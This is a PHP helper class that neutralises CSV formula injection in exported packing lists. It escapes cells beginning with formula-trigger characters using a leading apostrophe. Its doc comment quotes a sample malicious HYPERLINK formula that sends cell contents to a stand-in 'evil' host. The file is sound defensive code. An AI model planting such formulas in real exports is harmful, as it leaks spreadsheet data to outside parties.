<?php

declare(strict_types=1);

namespace App\Support;

/**
 * CSV output that Excel, Numbers and LibreOffice cannot be tricked into
 * executing.
 *
 * A cell whose first character is =, +, - or @ is treated as a formula by every
 * mainstream spreadsheet. A product name or a customer note is operator- or
 * customer-supplied text, so a field such as
 *
 *     =HYPERLINK("https://evil/?x="&A1,"Click")
 *
 * lands in the packing list and runs the moment someone opens it. Tab and
 * carriage return are here for the same reason: several versions strip leading
 * whitespace before deciding, so "\t=cmd" is a formula again.
 *
 * The defence is a leading apostrophe, which every reader treats as "this is
 * text" and does not display. Quoting alone does NOT help — a quoted formula is
 * still a formula once the quotes are consumed by the CSV parser.
 */
final class Csv
{
    /** Characters that make a spreadsheet read the cell as a formula. */
    private const DANGEROUS = ['=', '+', '-', '@', "\t", "\r"];

    /** One field, made safe and quoted ready for output. */
    public static function cell(string|int|float|null $value): string
    {
        $text = (string) ($value ?? '');

        if ($text !== '' && in_array($text[0], self::DANGEROUS, true)) {
            $text = "'" . $text;
        }

        // Standard CSV quoting: wrap in quotes, double any quote inside. Done
        // after the apostrophe so the guard is inside the quoted field.
        return '"' . str_replace('"', '""', $text) . '"';
    }

    /** One record. */
    public static function row(array $values): string
    {
        return implode(',', array_map(static fn ($v) => self::cell($v), $values));
    }

    /**
     * A whole document, CRLF-terminated as RFC 4180 asks for, with a UTF-8 BOM
     * so Excel on Windows reads Arabic and the dirham symbol correctly instead
     * of as mojibake.
     *
     * @param  array<int, array<int, string|int|float|null>>  $rows
     */
    public static function document(array $rows, bool $bom = true): string
    {
        $body = implode("\r\n", array_map(static fn (array $r) => self::row($r), $rows));

        return ($bom ? "\xEF\xBB\xBF" : '') . $body . "\r\n";
    }
}
